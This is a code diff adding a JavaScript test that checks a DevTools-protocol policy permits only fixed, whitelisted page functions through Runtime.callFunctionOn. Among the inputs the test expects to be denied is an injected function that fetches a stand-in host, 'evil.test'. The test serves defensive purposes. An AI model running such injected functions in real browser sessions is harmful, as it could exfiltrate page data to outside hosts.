@@ -972,3 +972,19 @@ test('isolated worlds are created only in the leased root document with a fixed 
   assert.equal((await cdp('DOM.resolveNode', { backendNodeId: 5, objectGroup: 'x' })).code, 'POLICY_DENIED');
   assert.equal((await cdp('DOM.resolveNode', { backendNodeId: 'five' })).code, 'POLICY_DENIED');
 });
+
+test('root-session callFunctionOn only runs the fixed page functions with plain arguments', async () => {
+  const [{ checkedFunction }, { scrollByFunction }] = await Promise.all([
+    import('../dist/packages/provider-chromium/src/checked.js'), import('../dist/packages/provider-chromium/src/scroll.js')]);
+  const f = await fixture(); await f.call('lease.grant', { lease: f.lease });
+  const call = params => f.call('cdp', { lease: f.lease, method: 'Runtime.callFunctionOn', params });
+  const ok = { objectId: 'o1', returnByValue: true };
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction })).ok, true);
+  assert.equal((await call({ ...ok, functionDeclaration: scrollByFunction, arguments: [{ value: 0 }, { value: 40 }] })).ok, true);
+  assert.equal((await call({ ...ok, functionDeclaration: 'function(){return fetch("https://evil.test")}' })).code, 'POLICY_DENIED');
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction + ' ' })).code, 'POLICY_DENIED');
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction, awaitPromise: true })).code, 'POLICY_DENIED');
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction, executionContextId: 1 })).code, 'POLICY_DENIED');
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction, arguments: [{ value: { a: 1 } }] })).code, 'POLICY_DENIED');
+  assert.equal((await call({ ...ok, functionDeclaration: checkedFunction, arguments: [{ unserializableValue: 'NaN' }] })).code, 'POLICY_DENIED');
+});
